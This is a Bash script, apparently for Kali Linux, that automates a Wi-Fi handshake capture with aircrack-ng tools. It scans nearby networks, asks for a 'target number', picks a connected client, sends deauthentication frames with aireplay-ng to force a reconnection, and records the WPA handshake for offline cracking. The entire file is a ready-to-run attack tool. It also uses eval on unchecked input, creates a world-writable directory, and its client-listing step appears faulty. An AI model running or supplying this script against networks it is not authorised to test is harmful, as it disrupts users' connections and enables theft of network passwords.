#!/bin/bash

# Define color variables
YELLOW='\033[1;33m'
RED='\033[31m'
GREEN='\033[32m'
NC='\033[0m'  # No Color

# Prompt user for their username on Kali
read -p "$(echo -e "${YELLOW}Enter your username on Kali: ${NC}")" username

# Create a directory for storing Wi-Fi data with full permissions
mkdir -m 777 /home/$username/Desktop/wifi

Directory="/home/$username/Desktop/wifi"
OUTPUT_FILE="${Directory}/handshake"

# Test the wireless interface
aireplay-ng --test wlan1

# Run airodump-ng to scan networks and save results in CSV format
airodump-ng wlan1 -w $OUTPUT_FILE --output-format csv

# Extract network information from CSV and convert it to readable text
awk -F',' 'NR > 2 && NF > 14 {print NR-2 ": " "SSID: " $14 ", BSSID: " $1 ", Channel: " $4 ", Signal: " $9}' ${OUTPUT_FILE}-01.csv > ${OUTPUT_FILE}.txt

echo " "
echo " "
echo -e "${GREEN}Available networks:${NC}"

# Display the networks in a formatted way
cat ${OUTPUT_FILE}.txt | grep -E "SSID|BSSID|Channel" | awk -F", " '{
    split($1, a, ": "); ssid = a[3]; 
    split($2, b, ": "); bssid = b[2]; 
    split($3, c, ": "); channel = c[2]; 
    printf "%d: SSID: %-10s BSSID: %-20s Channel: %s\n", NR, ssid, bssid, channel
}'

# Prompt user to select a target network
read -p "$(echo -e "${RED}Enter your target number: ${NC}")" network_number

# Extract BSSID and channel of the selected network
BSSID=$(awk -F',' -v num=$network_number 'NR == num+2 {print $1}' ${OUTPUT_FILE}-01.csv)
CHANNEL=$(awk -F',' -v num=$network_number 'NR == num+2 {print $4}' ${OUTPUT_FILE}-01.csv)

echo " "
echo "Selected Network:"
echo " "
echo "BSSID: $BSSID, Channel: $CHANNEL"

# Start airodump-ng to monitor selected network and collect handshake
airodump-ng --bssid $BSSID --channel $CHANNEL --write ${OUTPUT_FILE}_handshake wlan1 

# Display connected clients
awk -F',' 'NR > 2 && NF > 6 {print NR-2 ": " "Client MAC: " $1}' ${OUTPUT_FILE}-01.csv > ${OUTPUT_FILE}_clients.txt

echo "Connected clients:"
echo " "
cat ${OUTPUT_FILE}_clients.txt

# Prompt user to select a client
read -p "$(echo -e "${YELLOW}Enter client number: ${NC}")" client_number

# Extract the MAC address of the selected client
CLIENT_MAC=$(awk -F',' -v num=$client_number 'NR == num+2 {print $1}' ${OUTPUT_FILE}-01.csv)

echo -e "${GREEN}Client MAC is: $CLIENT_MAC${NC}"

# Clean up previous data in the wifi directory
rm -r /home/$username/Desktop/wifi/*

# Prepare airodump-ng and aireplay-ng commands
command1="airodump-ng --bssid $BSSID --channel $CHANNEL --write ${OUTPUT_FILE}_handshake wlan1 &"
command2="aireplay-ng --deauth 5 -a $BSSID -c $CLIENT_MAC wlan1 &"

# Run both commands
eval "$command1"
eval "$command2"

# Allow time for handshake capture
sleep 12

# Terminate both processes
echo "Killing airodump-ng process..."
pkill -f "airodump-ng"

echo "Killing aireplay-ng process..."
pkill -f "aireplay-ng"

# Notify user of saved handshake
echo -e "${GREEN}Your handshake was saved in /home/$username/Desktop/wifi${NC}"
